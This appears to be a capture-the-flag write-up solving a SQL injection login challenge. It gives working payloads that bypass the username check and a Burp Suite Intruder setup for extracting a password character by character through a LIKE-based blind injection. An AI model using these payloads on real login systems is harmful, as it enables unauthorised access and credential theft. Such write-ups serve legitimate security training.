### hints
* Credentials are secret, flags are secret. Coincidence?

### solution

1. navigate to a login page
2. bypass username with `' or 1 = 1 #`
3. you should see **Invalid Password** error message
   * :success:
4. now we try to brute force the password one character at a time
5. open burp suite and make sure intercept is **on**
6. on the browser, enter the following value in *Username* field:
   * `' or password LIKE 'a%'`
   * doesn't have to be `a`... can be any placeholder character
7. go back to burp where the request will be waiting for you
8. send the request to *Intruder*
9. in *Intruder* tab...
   * *Target* should be set correctly
   * in *Positions*, clear all markers and add new ones around `a` mentioned above
      * i.e. `username=%27+or+password+LIKE+%27§a§%25%27+%23&password=`
   * in *Payloads*...
      * Payload set: `1`
      * Payload type: `Brute forcer`
      * Character set: `abcdefghijklmnopqrstuvwxyz0123456789`
      * Min length: `1`
      * Max length: `1`
10. **Start attack**
11. check which character is not like the others. in my case, it was **r**
12. repeat steps 9 - 11 for each character in the password until you see the flag show up in the response
    * `username=%27+or+password+LIKE+%27r§a§%25%27+%23&password=r`
    * `username=%27+or+password+LIKE+%27ro§a§%25%27+%23&password=ro`
    * ...
    * `username=%27+or+password+LIKE+%27robbyn§a§%25%27+%23&password=robbyn`
    * eureka!
